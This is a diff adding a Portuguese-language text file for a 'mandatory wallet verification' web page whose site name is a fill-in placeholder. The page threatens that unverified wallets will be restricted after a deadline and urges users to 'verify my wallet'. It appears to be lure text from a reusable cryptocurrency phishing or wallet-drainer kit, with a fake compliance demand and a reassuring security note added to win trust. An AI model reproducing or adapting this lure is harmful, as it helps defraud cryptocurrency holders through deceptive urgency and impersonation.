@@ -1,0 +1,29 @@
+﻿{
+    "pageTitle": "Verificação de Carteira | {websiteName}",
+    "mainTitle": "Verificação de Carteira Obrigatória",
+    "description1": "Para manter os padrões de segurança e conformidade regulatória, agora exigimos a verificação do endereço da carteira para todos os usuários.",
+    "deadlineText": "A partir de {date}, qualquer carteira não verificada será",
+    "restrictionText": " temporariamente restrita",
+    "cooperationText": "Agradecemos sua cooperação em manter nossa plataforma segura.",
+    "termsText": "Eu concordo com os",
+    "termsLink": "Termos de uso da {websiteName}",
+    "verifyBtnText": "Verificar Minha Carteira",
+    "securityBtnText": "Sobre Frases Comprometidas",
+    "modalTitle": "Alerta de Segurança: Frases de Recuperação Comprometidas",
+    "modalWarning": "Aviso Crítico:",
+    "modalWarningText": "Sua frase de recuperação é a chave mestra da sua carteira. Nunca a revele a ninguém nem a insira em nenhum site.",
+    "signsTitle": "Sinais de uma frase comprometida:",
+    "signsList": [
+        "Armazenou digitalmente (fotos, nuvem, mensagens)",
+        "Transações não autorizadas em sua carteira"
+    ],
+    "actionTitle": "Ações imediatas necessárias se comprometida:",
+    "actionList": [
+        "Transfira todos os fundos imediatamente para uma nova carteira segura",
+        "Gere uma nova frase de recuperação completamente diferente"
+    ],
+    "modalNote": "Nota: A {websiteName} nunca pedirá sua frase de recuperação. Este processo de verificação requer apenas seu endereço público de carteira."
+} 
+
+
+
